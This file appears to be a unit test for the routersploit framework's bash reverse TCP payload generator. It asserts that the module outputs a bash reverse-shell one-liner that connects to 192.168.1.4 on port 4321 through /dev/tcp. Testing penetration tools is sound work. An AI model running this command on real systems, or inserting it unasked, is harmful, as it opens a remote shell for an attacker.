from routersploit.modules.payloads.cmd.bash_reverse_tcp import Payload


# bash reverse tcp payload with lhost=192.168.1.4 lport=4321
reverse_tcp = (
    "bash -i >& /dev/tcp/192.168.1.4/4321 0>&1"
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Payload()
    payload.lhost = "192.168.1.4"
    payload.lport = 4321

    assert payload.run() == reverse_tcp
